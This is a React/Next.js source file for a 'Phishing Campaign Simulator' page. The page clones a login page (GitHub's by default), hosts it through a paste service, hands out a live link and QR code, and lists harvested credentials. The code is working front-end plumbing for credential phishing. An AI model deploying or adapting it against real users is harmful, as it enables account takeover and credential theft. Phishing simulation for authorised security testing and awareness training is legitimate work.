
'use client';

import { useState, useEffect } from 'react';
import type { CapturedCredential } from '@/components/credential-harvester';
import { useToast } from '@/hooks/use-toast';
import { CredentialHarvester } from '@/components/credential-harvester';
import { LoginPageCloner } from '@/components/login-page-cloner';
import { QrCodeGenerator } from '@/components/qr-code-generator';
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, Clipboard } from 'lucide-react';
import { hostOnPasteRs } from '@/actions/paste-action';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';

const clonerSchema = z.object({
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
  urlToClone: z.string().optional(),
  htmlContent: z.string().optional(),
}).refine(data => data.urlToClone || data.htmlContent, {
  message: 'Either a URL or HTML content is required.',
  path: ['urlToClone'],
});

export default function PhishingPage() {
  const { toast } = useToast();
  const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
  const storageKey = 'netra-captured-credentials';
  const { user } = useAuth();

  const form = useForm<z.infer<typeof clonerSchema>>({
    resolver: zodResolver(clonerSchema),
    defaultValues: {
      redirectUrl: 'https://github.com/password_reset',
      urlToClone: 'https://github.com/login',
      htmlContent: '',
    },
  });

  const [hostedUrl, setHostedUrl] = useState<string | null>(null);
  const [isHosting, setIsHosting] = useState(false);

  // Load credentials from storage on initial client render
  useEffect(() => {
    loadCredentialsFromStorage();
  }, []);
  
  // Listen for storage changes to update credentials in real-time
  useEffect(() => {
    const handleStorageChange = (event: StorageEvent) => {
      if (event.key === storageKey) {
        loadCredentialsFromStorage(); // Reload from storage
        const newCredsRaw = event.newValue;
         if (newCredsRaw) {
            const newCredsList = JSON.parse(newCredsRaw);
            if(newCredsList.length > capturedCredentials.length) {
                 toast({
                  variant: "destructive",
                  title: "Credentials Captured!",
                  description: "New credentials have been harvested.",
                });
            }
         }
      }
    };
    window.addEventListener('storage', handleStorageChange);
    return () => {
      window.removeEventListener('storage', handleStorageChange);
    };
  }, [capturedCredentials.length, toast]);

  const loadCredentialsFromStorage = () => {
    try {
        const storedCreds = localStorage.getItem(storageKey);
        setCapturedCredentials(storedCreds ? JSON.parse(storedCreds) : []);
    } catch (error) {
        console.error('Failed to load credentials from localStorage', error);
        setCapturedCredentials([]);
    }
  };

  const handleClearCredentials = () => {
    setCapturedCredentials([]);
    localStorage.removeItem(storageKey);
  };

  const handleHostPage = async (htmlContent: string) => {
    setIsHosting(true);
    setHostedUrl(null);
    toast({ title: "Hosting Page...", description: "Uploading content to secure host." });

    const redirectUrl = form.getValues('redirectUrl');

    try {
      const result = await hostOnPasteRs(htmlContent);
      if (!result.success || !result.pasteId) {
        throw new Error(result.error || "Failed to get a paste ID from the hosting service.");
      }
      
      const url = `${window.location.origin}/api/phishing/serve/${result.pasteId}?redirectUrl=${encodeURIComponent(redirectUrl)}`;
      setHostedUrl(url);
      
      toast({ title: "Page Hosted Successfully!", description: "Link is ready to be shared." });

      const urlToClone = form.getValues('urlToClone');
      logActivity({
          user: user?.displayName || 'Operator',
          action: 'Hosted Phishing Page',
          details: `Source: ${urlToClone || 'Pasted HTML'}`
      });

    } catch (e) {
      const error = e instanceof Error ? e.message : "An unknown error occurred";
      toast({ variant: 'destructive', title: "Hosting Failed", description: error });
    } finally {
      setIsHosting(false);
    }
  };
  
  const handleCopyUrl = () => {
    if (hostedUrl) {
      navigator.clipboard.writeText(hostedUrl);
      toast({ title: 'Copied!', description: 'Hosted URL copied to clipboard.' });
    }
  };

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Phishing Campaign Simulator</h1>
        <p className="text-muted-foreground">Clone login pages and manage credential harvesting campaigns.</p>
      </div>
      
      <div className="grid lg:grid-cols-2 gap-6 items-start">
        <div className="flex flex-col gap-6">
          <LoginPageCloner form={form} onHostPage={handleHostPage} />
          
          {isHosting && (
            <Card className="flex items-center justify-center p-8">
              <Loader2 className="h-8 w-8 animate-spin text-muted-foreground" />
              <p className="ml-4">Hosting page...</p>
            </Card>
          )}

          {hostedUrl && (
             <Card>
               <CardHeader>
                 <CardTitle>Hosted Page URL</CardTitle>
                 <CardDescription>Your phishing page is live. Use the URL or QR code below.</CardDescription>
               </CardHeader>
               <CardContent className="space-y-4">
                 <div className="flex w-full items-center gap-2">
                   <Input readOnly value={hostedUrl} className="font-mono" />
                   <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
                     <Clipboard className="h-4 w-4" />
                   </Button>
                 </div>
                 <div className="flex justify-center">
                   <QrCodeGenerator url={hostedUrl} />
                 </div>
               </CardContent>
             </Card>
           )}
        </div>
        
        <div className="flex flex-col gap-6">
          <CredentialHarvester 
            credentials={capturedCredentials} 
            onClear={handleClearCredentials} 
            onRefresh={loadCredentialsFromStorage} 
          />
        </div>
      </div>
    </div>
  );
}
